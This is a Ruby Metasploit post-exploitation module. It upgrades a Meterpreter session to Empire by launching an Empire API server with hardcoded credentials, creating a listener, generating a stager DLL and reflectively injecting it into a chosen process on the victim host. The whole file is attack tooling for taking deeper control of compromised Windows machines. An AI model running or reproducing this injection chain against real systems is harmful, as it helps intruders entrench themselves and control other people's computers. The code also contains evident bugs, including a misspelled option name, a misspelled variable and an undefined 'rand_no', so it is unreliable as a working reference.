##
# This module requires Metaspoit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'
require 'msf/core/empire_lib'
require 'msf/core/Empire-UI'
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::EmpireUI

  def initialize(info={})
    super(update_info(info,
                      "Name"                => "Upgrading to Empire from Meterpreter Post Module",
                      "Description"         => " This module will set up a bridge between the already existing meterpretr session and the Empire instance hosted over the port 1337. Please note that you need to have Empire Web-API preinstalled in your machine.",
                      "LICENSE"             => MSF_LICENSE,
                      "Platform"            => ["multi"],
                      "SessionTypes"        => ["meterpreter"],
                      "Author"              => ["author"]
                     ))
    register_options(
      [
        OptPort.new('LPORT',[false, 'Port for payload to connect to, make sure port is not already in use', 7878 ]),
        OptString.new('PathToEmpire', [true, 'The Complete Path to Empire-Web API']),
        OptInt.new('PID', [true,'Process Identifier to inject the Empire payload into'])
      ])
  end
    #run method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
    #Make sure that 1337 is not being used by another service
    command = "netstat -nlt | grep 1337"
    value = system(command)
    raise "Port 1337 is already in use by foreign service" if value

    #Fetching User inputs
    path = datastore['PathToEmpre'].to_s
    pid = datastore['PID'].to_i
    lport = datastore['LPORT'].to_s

    #Initiating the Empire Instance thread with provided username and pass
    Dir.chdir(path.chomp)
    command = "./empire --headless --username 'msf-empire' --password 'msf-empire' > /dev/null"
    print_status("Initiating Empire Web-API, this may take upto few seconds")
    server = Thread.new{
      value = system(command)
    }
    sleep(10)

    #Creating the Empire Object
    client_emp = Msf::Empire::Client.new('msf-empire', 'msf-empire')

    #Creating a random listener which will destroyed after session)
    listener_name = "Listener_Emp"
    response = client_emp.create_listener(listener_name, lport)
    raise reponse.to_s if response.to_s.include?("error")
    print_status(response)

    #Creating the DLL for reflective DLL injection
    payload_path = "/tmp/launcher#{rand_no}.dll"
    print_status("Creating DLL for injection")
    client_emp.gen_stager(listener_name,"launcher/dll", payload_path)

    #Injecting the created DLL payload reflectively in the target process
    host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
    print_status("Injecting #{payload_path} into #{pid}")
    dll_mem, offset = inject_dll_into_process(host_process, payload_path)
    print_status("DLL Injected. Executing Reflective loader")
    host_process.thread.create(dll_mem + offset, 0)
    print_status("DLL injected and invoked")

    #Checking for agents connected after an interval of 6 seconds
    sleep(6)
    agent_name = client_emp.get_agents(true)

    #Interacting with detected agent.
    ui_main(client_emp, agent_name)
  end
end


